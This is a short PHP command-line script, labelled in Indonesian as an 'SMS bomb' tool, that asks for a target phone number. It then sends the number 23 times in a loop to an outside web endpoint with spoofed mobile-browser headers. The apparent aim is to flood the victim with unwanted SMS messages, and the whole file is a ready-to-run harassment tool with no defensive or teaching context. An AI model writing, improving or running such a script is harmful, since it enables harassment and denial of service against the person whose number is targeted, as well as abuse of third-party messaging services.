<?php
function nabila($a, $no) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://api-nabilah.000webhostapp.com/dog.php?no=".$no."");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
		$headers = array ();
			    $headers[] = "Host: api-nabilah.000webhostapp.com";
                $headers[] = "Connection: keep-alive";
                $headers[] = "Accept: */*";
                $headers[] = "X-Requested-With: XMLHttpRequest";
                $headers[] = "Save-Data: on";
                $headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		$result = curl_exec($ch);
	return $result;	

}
print "Bom SMS - Nabila Tools\n";
print "Thanks To : Muhammad Ikhsan Aprilyadi\n\n";
echo "Nomor Target : ";
$no = trim(fgets(STDIN));
for($a=2;$a<25;$a++){
$res   = nabila($a, $no);
        //get nomor
    echo "SMS Masuk Ga Njing\n";
    
    }
?>